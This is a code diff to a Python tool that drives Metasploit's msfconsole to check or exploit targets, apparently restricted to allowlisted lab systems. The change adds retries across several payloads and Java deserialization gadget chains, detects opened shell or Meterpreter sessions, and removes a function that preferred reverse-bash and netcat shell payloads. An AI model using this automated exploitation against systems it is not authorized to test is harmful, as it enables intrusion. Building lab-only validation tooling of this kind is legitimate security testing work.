@@ -59,12 +59,113 @@ def run_metasploit_module(
             "metasploit_plan": {**plan, "options": options},
         }
 
-    module_path = plan.get("module_path")
-    selected_payload = plan.get("selected_payload")
+    attempts = []
+    payloads = payload_attempts(plan) if action == "exploit" else [plan.get("selected_payload", "")]
+    final: dict[str, Any] | None = None
+    for selected_payload in payloads:
+        for variant_options in option_variants(plan, options):
+            attempt_options = dict(variant_options)
+            if action == "exploit":
+                attempt_options = {**attempt_options, **exploit_payload_options(target, selected_payload)}
+            proc, stdout, stderr, elapsed, command = run_msfconsole_action(
+                msfconsole,
+                plan.get("module_path"),
+                attempt_options,
+                selected_payload,
+                action,
+                timeout=timeout,
+            )
+            combined = stdout + "\n" + stderr
+            verdict = parse_check_verdict(combined)
+            session_created = bool(re.search(r"(command shell|meterpreter) session \d+ opened", combined, re.I))
+            command_proof = bool(re.search(r"\buid=\d+.*\bgid=\d+", combined))
+            command_executed = bool(re.search(r"\[\+\]\s+command executed\b", combined, re.I))
+            exploited = action == "exploit" and (session_created or command_proof or command_executed)
+            final = {
+                "payload": selected_payload,
+                "options": attempt_options,
+                "command": command,
+                "returncode": proc.returncode,
+                "stdout": stdout,
+                "stderr": stderr,
+                "elapsed_seconds": round(elapsed, 3),
+                "verdict": verdict,
+                "session_created": session_created,
+                "command_proof": command_proof,
+                "command_executed": command_executed,
+                "exploited": exploited,
+            }
+            attempts.append(summarize_attempt(final))
+            if exploited or action != "exploit":
+                break
+            if not should_retry_payload(combined):
+                break
+        if final and (final.get("exploited") or action != "exploit"):
+            break
+
+    if final is None:
+        final = {
+            "payload": "",
+            "options": options,
+            "command": [],
+            "returncode": -1,
+            "stdout": "",
+            "stderr": "",
+            "elapsed_seconds": 0,
+            "verdict": "no_check_signal",
+            "session_created": False,
+            "command_proof": False,
+            "command_executed": False,
+            "exploited": False,
+        }
+    stdout = final["stdout"]
+    stderr = final["stderr"]
+    verdict = final["verdict"]
+    session_created = final["session_created"]
+    command_proof = final["command_proof"]
+    command_executed = final["command_executed"]
+    exploited = final["exploited"]
+    verified = exploited or verdict == "appears_vulnerable"
+    return {
+        "allowed": True,
+        "verified": verified,
+        "exploited": exploited,
+        "cleanup_verified": "killing all sessions" in f"{stdout}\n{stderr}".lower() or not session_created,
+        "reason": exploit_reason(verdict, exploited, session_created, command_executed) if action == "exploit" else check_reason(verdict),
+        "proof_output": first_interesting_line(stdout) if verified else "",
+        "proof_goal": (
+            "Run Metasploit exploit against an allowlisted isolated lab target and collect session proof."
+            if action == "exploit"
+            else "Run Metasploit check against an allowlisted lab target; do not execute exploit."
+        ),
+        "metasploit_plan": {**plan, "options": final["options"], "attempted_payloads": payloads},
+        "metasploit_check": {
+            "command": redact_command(final["command"]),
+            "returncode": final["returncode"],
+            "stdout": stdout[-6000:],
+            "stderr": stderr[-3000:],
+            "elapsed_seconds": final["elapsed_seconds"],
+            "verdict": verdict,
+            "action": action,
+            "session_created": session_created,
+            "command_proof": command_proof,
+            "command_executed": command_executed,
+            "payload": final["payload"],
+            "attempts": attempts,
+        },
+    }
+
+
+def run_msfconsole_action(
+    msfconsole: str,
+    module_path: str,
+    options: dict[str, str],
+    selected_payload: str,
+    action: str,
+    *,
+    timeout: int,
+) -> tuple[subprocess.CompletedProcess[str], str, str, float, list[str]]:
     resource_lines = [f"use {module_path}"]
-    if action == "exploit":
-        selected_payload = choose_exploit_payload(plan)
-        options = {**options, **exploit_payload_options(target, selected_payload)}
     for key, value in options.items():
         if key in {"LHOST", "LPORT"} and selected_payload == "":
             continue
@@ -78,54 +179,65 @@ def run_metasploit_module(
         resource_lines.extend(["run -j", "sleep 12", "sessions -l", "sessions -K", "exit -y"])
     else:
         resource_lines.extend(["check", "exit -y"])
-    command_text = "; ".join(resource_lines)
-    command = [msfconsole, "-q", "-x", command_text]
-
+    command = [msfconsole, "-q", "-x", "; ".join(resource_lines)]
     started = time.monotonic()
     proc = subprocess.run(command, text=True, capture_output=True, timeout=timeout, check=False)
     elapsed = time.monotonic() - started
-    stdout = strip_ansi(proc.stdout)
-    stderr = strip_ansi(proc.stderr)
-    combined = stdout + "\n" + stderr
-    verdict = parse_check_verdict(combined)
-    session_created = bool(re.search(r"(command shell|meterpreter) session \d+ opened", combined, re.I))
-    command_proof = bool(re.search(r"\buid=\d+.*\bgid=\d+", combined))
-    exploited = action == "exploit" and (session_created or command_proof)
-    verified = exploited or verdict == "appears_vulnerable"
+    return proc, strip_ansi(proc.stdout), strip_ansi(proc.stderr), elapsed, command
+
+
+def payload_attempts(plan: dict[str, Any]) -> list[str]:
+    seen: set[str] = set()
+    payloads: list[str] = []
+
+    def add(payload: str) -> None:
+        if payload and payload not in seen:
+            seen.add(payload)
+            payloads.append(payload)
+
+    add(str(plan.get("selected_payload") or ""))
+    for item in plan.get("payload_candidates", []):
+        if isinstance(item, dict):
+            add(str(item.get("payload") or ""))
+        else:
+            add(str(item))
+    return payloads[:4] or [""]
+
+
+def option_variants(plan: dict[str, Any], options: dict[str, str]) -> list[dict[str, str]]:
+    variants = [dict(options)]
+    text = " ".join(str(plan.get(key, "")) for key in ["module_path", "module_id"]).lower()
+    if any(term in text for term in ["deserialize", "deserial", "shiro"]):
+        for chain in ["CommonsBeanutils1", "CommonsCollections2", "CommonsCollections1"]:
+            variant = {**options, "JAVA_GADGET_CHAIN": chain}
+            if variant not in variants:
+                variants.append(variant)
+    return variants[:4]
+
+
+def should_retry_payload(output: str) -> bool:
+    lowered = output.lower()
+    retry_signals = [
+        "is not a compatible payload",
+        "no session was created",
+        "exploit aborted",
+        "cannot reliably check exploitability",
+    ]
+    return any(signal in lowered for signal in retry_signals)
+
+
+def summarize_attempt(attempt: dict[str, Any]) -> dict[str, Any]:
     return {
-        "allowed": True,
-        "verified": verified,
-        "exploited": exploited,
-        "cleanup_verified": "killing all sessions" in combined.lower() or not session_created,
-        "reason": exploit_reason(verdict, exploited, session_created) if action == "exploit" else check_reason(verdict),
-        "proof_output": first_interesting_line(stdout) if verified else "",
-        "proof_goal": (
-            "Run Metasploit exploit against an allowlisted isolated lab target and collect session proof."
-            if action == "exploit"
-            else "Run Metasploit check against an allowlisted lab target; do not execute exploit."
-        ),
-        "metasploit_plan": {**plan, "options": options},
-        "metasploit_check": {
-            "command": redact_command(command),
-            "returncode": proc.returncode,
-            "stdout": stdout[-6000:],
-            "stderr": stderr[-3000:],
-            "elapsed_seconds": round(elapsed, 3),
-            "verdict": verdict,
-            "action": action,
-            "session_created": session_created,
-            "command_proof": command_proof,
-        },
+        "payload": attempt.get("payload", ""),
+        "returncode": attempt.get("returncode"),
+        "verdict": attempt.get("verdict"),
+        "session_created": attempt.get("session_created", False),
+        "command_proof": attempt.get("command_proof", False),
+        "command_executed": attempt.get("command_executed", False),
+        "exploited": attempt.get("exploited", False),
+        "elapsed_seconds": attempt.get("elapsed_seconds"),
+        "last_line": last_interesting_line(f"{attempt.get('stdout', '')}\n{attempt.get('stderr', '')}"),
     }
-
-
-def choose_exploit_payload(plan: dict[str, Any]) -> str:
-    payloads = [str(item) for item in plan.get("payload_candidates", []) if item]
-    selected = str(plan.get("selected_payload") or "")
-    for preferred in ["cmd/unix/reverse_bash", "cmd/unix/reverse_netcat", "cmd/unix/generic"]:
-        if preferred in payloads:
-            return preferred
-    return selected
 
 
 def exploit_payload_options(target: str, payload: str) -> dict[str, str]:
@@ -169,9 +281,11 @@ def check_reason(verdict: str) -> str:
     }.get(verdict, "Metasploit check produced an unrecognized result.")
 
 
-def exploit_reason(verdict: str, exploited: bool, session_created: bool) -> str:
+def exploit_reason(verdict: str, exploited: bool, session_created: bool, command_executed: bool) -> str:
     if exploited and session_created:
         return "Metasploit exploit opened a command or Meterpreter session in the isolated lab and cleanup was attempted."
+    if exploited and command_executed:
+        return "Metasploit reported command execution in the isolated lab."
     if exploited:
         return "Metasploit exploit produced command-execution proof in the isolated lab."
     if verdict == "appears_vulnerable":
@@ -188,10 +302,18 @@ def first_interesting_line(output: str) -> str:
         if re.search(r"\buid=\d+.*\bgid=\d+", line):
             return line.strip()
     for line in output.splitlines():
+        if re.search(r"\[\+\]\s+command executed\b", line, flags=re.I):
+            return line.strip()
+    for line in output.splitlines():
         lowered = line.lower()
         if "appears to be vulnerable" in lowered or "is vulnerable" in lowered:
             return line.strip()
     return ""
+
+
+def last_interesting_line(output: str) -> str:
+    interesting = [line.strip() for line in output.splitlines() if line.strip()]
+    return interesting[-1] if interesting else ""
 
 
 def strip_ansi(value: str) -> str:
